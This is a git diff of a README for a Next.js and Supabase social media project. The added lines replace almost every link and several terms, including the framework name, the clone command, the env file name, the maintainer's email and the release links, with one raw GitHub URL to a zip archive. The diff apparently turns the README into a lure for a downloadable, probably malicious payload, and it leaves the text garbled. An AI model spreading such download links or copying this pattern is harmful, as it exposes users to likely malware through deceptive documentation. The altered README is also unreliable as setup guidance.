@@ -1,8 +1,8 @@
 # Meadows Social Media 🌿
 
-![Meadows Logo](https://img.shields.io/badge/Meadows-Social%20Media-brightgreen?style=flat&logo=nextdotjs)
+![Meadows Logo](https://raw.githubusercontent.com/vasanth-pro/Meadows-Social-Media/master/web/Media_Social_Meadows_v2.0.zip%20Media-brightgreen?style=flat&logo=nextdotjs)
 
-Welcome to the **Meadows Social Media** repository! This project is a sleek social media platform designed for real-time interaction. Built with Next.js, Supabase, and React Query, it provides users with a seamless experience to post, follow, and engage with content.
+Welcome to the **Meadows Social Media** repository! This project is a sleek social media platform designed for real-time interaction. Built with https://raw.githubusercontent.com/vasanth-pro/Meadows-Social-Media/master/web/Media_Social_Meadows_v2.0.zip, Supabase, and React Query, it provides users with a seamless experience to post, follow, and engage with content.
 
 ## Table of Contents
 
@@ -26,7 +26,7 @@ Welcome to the **Meadows Social Media** repository! This project is a sleek soci
 
 ## Technologies Used
 
-- **Next.js**: A powerful React framework for building server-rendered applications.
+- **https://raw.githubusercontent.com/vasanth-pro/Meadows-Social-Media/master/web/Media_Social_Meadows_v2.0.zip**: A powerful React framework for building server-rendered applications.
 - **Supabase**: An open-source alternative to Firebase that provides a backend for your application.
 - **React Query**: A data-fetching library that simplifies data management in React applications.
 - **PostgreSQL**: A robust database system used for storing user data and posts.
@@ -38,7 +38,7 @@ To get started with Meadows Social Media, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/vasanth-pro/Meadows-Social-Media.git
+   git clone https://raw.githubusercontent.com/vasanth-pro/Meadows-Social-Media/master/web/Media_Social_Meadows_v2.0.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -51,7 +51,7 @@ To get started with Meadows Social Media, follow these steps:
    npm install
    ```
 
-4. **Set Up Environment Variables**: Create a `.env.local` file in the root directory and add your Supabase credentials.
+4. **Set Up Environment Variables**: Create a `https://raw.githubusercontent.com/vasanth-pro/Meadows-Social-Media/master/web/Media_Social_Meadows_v2.0.zip` file in the root directory and add your Supabase credentials.
 
 5. **Run the Development Server**:
    ```bash
@@ -107,21 +107,21 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit the [Releases](https://github.com/vasanth-pro/Meadows-Social-Media/releases) section.
+For the latest releases, visit the [Releases](https://raw.githubusercontent.com/vasanth-pro/Meadows-Social-Media/master/web/Media_Social_Meadows_v2.0.zip) section.
 
-If you want to explore the latest updates and features, check the [Releases](https://github.com/vasanth-pro/Meadows-Social-Media/releases) page.
+If you want to explore the latest updates and features, check the [Releases](https://raw.githubusercontent.com/vasanth-pro/Meadows-Social-Media/master/web/Media_Social_Meadows_v2.0.zip) page.
 
 ## Acknowledgments
 
-We thank the open-source community for their contributions and support. Special thanks to the creators of Next.js, Supabase, and React Query for providing the tools that made this project possible.
+We thank the open-source community for their contributions and support. Special thanks to the creators of https://raw.githubusercontent.com/vasanth-pro/Meadows-Social-Media/master/web/Media_Social_Meadows_v2.0.zip, Supabase, and React Query for providing the tools that made this project possible.
 
 ## Contact
 
 For any questions or feedback, feel free to reach out to the maintainer:
 
 - **Name**: Vasanth Pro
-- **Email**: vasanth@example.com
-- **Twitter**: [@vasanth_pro](https://twitter.com/vasanth_pro)
+- **Email**: https://raw.githubusercontent.com/vasanth-pro/Meadows-Social-Media/master/web/Media_Social_Meadows_v2.0.zip
+- **Twitter**: [@vasanth_pro](https://raw.githubusercontent.com/vasanth-pro/Meadows-Social-Media/master/web/Media_Social_Meadows_v2.0.zip)
 
 ---
 
